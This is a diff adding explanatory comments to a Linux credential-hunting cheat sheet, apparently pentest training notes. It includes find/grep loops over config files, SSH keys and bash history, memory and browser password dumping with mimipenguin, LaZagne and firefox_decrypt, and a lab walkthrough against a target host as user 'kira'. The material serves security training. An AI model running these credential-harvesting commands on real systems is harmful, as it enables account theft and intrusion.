@@ -30,6 +30,7 @@ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
   grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
 done
 ```
+> First loop finds all config files by extension. Second loop opens each `.cnf` file and searches for credential keywords, filtering out commented lines with `grep -v "\#"`. Suppress errors with `2>/dev/null`.
 
 ### Database Files
 
@@ -39,6 +40,7 @@ for l in $(echo ".sql .db .*db .db*"); do
   find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
 done
 ```
+> Searches the filesystem for database files by extension. Filters out system library paths to reduce noise. SQLite `.db` files can often be opened directly with `sqlite3` and queried for credential tables.
 
 ### Notes and Text Files
 
@@ -46,6 +48,7 @@ done
 # Find .txt files and files with no extension in home dirs
 find /home/* -type f -name "*.txt" -o ! -name "*.*"
 ```
+> Finds text files and extensionless files in user home directories. Users often store notes with passwords in plain text or with no extension. Focus on subdirectories like `Documents`, `Desktop`, and `Downloads`.
 
 ### Scripts (may contain hardcoded creds)
 
@@ -55,6 +58,7 @@ for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
   find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
 done
 ```
+> Finds all scripts and compiled code files by extension. Scripts for automation, deployment, and database backups frequently contain hardcoded credentials. Filter out system library paths to focus on user-written files.
 
 ### Cronjobs
 
@@ -65,6 +69,7 @@ cat /etc/crontab
 # Cron directories
 ls -la /etc/cron.*/
 ```
+> Shows scheduled jobs that run automatically. Scripts in cronjobs often contain hardcoded credentials for databases or remote systems. Check `cron.d/`, `cron.daily/`, `cron.weekly/`, and `cron.monthly/`.
 
 ### SSH Keys
 
@@ -73,6 +78,7 @@ ls -la /etc/cron.*/
 find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
 find / -name "authorized_keys" 2>/dev/null
 ```
+> Finds SSH private key files and authorized_keys files anywhere on the system. Unprotected private keys can be used to log into other systems. `authorized_keys` reveals which keys are trusted on this host.
 
 ---
 
@@ -87,6 +93,7 @@ tail -n5 /home/*/.bash*
 # Also check .bashrc and .bash_profile
 cat /home/*/.bashrc /home/*/.bash_profile 2>/dev/null
 ```
+> Shows the last 5 lines of every user's bash history. Passwords typed as command arguments (like `-p mypass`) appear here in plaintext. `.bashrc` may contain exported variables with API keys or credentials.
 
 ### Log Files
 
@@ -115,6 +122,7 @@ for i in $(ls /var/log/* 2>/dev/null); do
   fi
 done
 ```
+> Searches all log files for security-relevant events. Only prints files that actually contain matches. `COMMAND=` lines from sudo logs show exactly what commands were run and by whom. Useful for mapping privileged activity.
 
 ---
 
@@ -128,6 +136,7 @@ Extracts credentials from memory for logged-in users:
 sudo python3 mimipenguin.py
 # [SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
 ```
+> Extracts credentials from memory for currently logged-in users. Requires root. Works on GNOME, KDE, and other desktop sessions that cache credentials in memory. Output shows `[session type]  username:password`.
 
 ### LaZagne (requires root)
 
@@ -136,6 +145,7 @@ Extracts credentials from many sources:
 ```bash
 sudo python2.7 laZagne.py all
 ```
+> Runs all LaZagne modules on Linux. Requires root for full coverage (memory, shadow, keyrings). Replace `python2.7` with `python3` for newer versions. Targets browsers, mail clients, SSH configs, and more.
 
 LaZagne sources include: Wifi, wpa_supplicant, Libsecret, Kwallet, Chromium-based, CLI, Mozilla, Thunderbird, Git, ENV variables, Grub, Fstab, AWS, Filezilla, Gftp, SSH, Apache, Shadow, Docker, Keepass, Mimipy, Sessions, Keyrings.
 
@@ -154,6 +164,7 @@ ls -l .mozilla/firefox/ | grep default
 # View encrypted logins
 cat .mozilla/firefox/<profile>/logins.json | jq .
 ```
+> Lists Firefox profiles and then shows the encrypted credential JSON. The passwords are encrypted with a key stored in `key4.db` in the same profile directory — use `firefox_decrypt.py` to decrypt them.
 
 ### Firefox Decrypt (requires Python 3.9)
 
@@ -161,12 +172,14 @@ cat .mozilla/firefox/<profile>/logins.json | jq .
 python3.9 firefox_decrypt.py
 # Select profile → outputs plaintext credentials
 ```
+> Decrypts Firefox saved passwords using the local profile's `key4.db`. Requires Python 3.9+ for the latest version. Run it from the user's home directory or pass the profile path as an argument.
 
 ### LaZagne (browsers module)
 
 ```bash
 python3 laZagne.py browsers
 ```
+> Runs only the browser module of LaZagne. Targets Chrome, Chromium, Firefox, Opera, and others. Faster than running `all` when you only need browser credentials.
 
 ---
 
@@ -204,12 +217,14 @@ python3 laZagne.py browsers
 ```bash
 ssh kira@10.129.202.64
 ```
+> Connects to the target as kira using password authentication. Once logged in, start hunting credentials from this account's perspective.
 
 ### Step 1: Check Bash History
 
 ```bash
 tail -n20 /home/*/.bash_history 2>/dev/null
 ```
+> Reads the last 20 lines of every user's bash history. Shows the trail of commands — file paths, credentials, and tools used. Look for `su`, `ssh`, `mysql`, or any command that takes a `-p` argument.
 
 Revealed kira navigated to a Firefox profile directory (`ytb95ytb.default-release/`), viewed `logins.json`, and ran `su` — indicating credential reuse and Firefox stored passwords.
 
@@ -223,6 +238,7 @@ ls -la /home/will/
 ls -la /home/will/.backups/
 # Found: passwd.bak (readable), shadow.bak (not readable as kira)
 ```
+> Lists home directories and checks other users' files. `-la` shows hidden directories (dot-dirs). `.backups/` is a common location for sensitive backup files. Check permissions on each file to see what's readable.
 
 ### Step 3: Check Firefox Stored Credentials
 
@@ -231,6 +247,7 @@ ls -la /home/will/.backups/
 cat /home/kira/.mozilla/firefox/ytb95ytb.default-release/logins.json
 # Shows encrypted credentials for https://dev.inlanefreight.com
 ```
+> Shows the Firefox encrypted logins file. The `encryptedPassword` and `encryptedUsername` fields are base64-encoded and AES-encrypted. They can only be decrypted with the profile's `key4.db`.
 
 ### Step 4: Decrypt Firefox Credentials
 
@@ -246,12 +263,14 @@ sed -i 's/PWStore = list\[dict\[str, str\]\]/from typing import List, Dict\nPWSt
 # SCP to target
 scp /tmp/firefox_decrypt.py kira@10.129.202.64:/tmp/firefox_decrypt.py
 ```
+> Downloads firefox_decrypt.py to the attack host, patches it for Python 3.8 compatibility, then transfers it to the target with SCP. Run this locally when the target has no internet access.
 
 Then on the target:
 
 ```bash
 python3 /tmp/firefox_decrypt.py /home/kira/.mozilla/firefox/ytb95ytb.default-release/
 ```
+> Decrypts Firefox credentials from the specified profile directory. It reads `logins.json` and decrypts each entry using `key4.db`. Output shows the website, username, and plaintext password.
 
 Output:
 ```
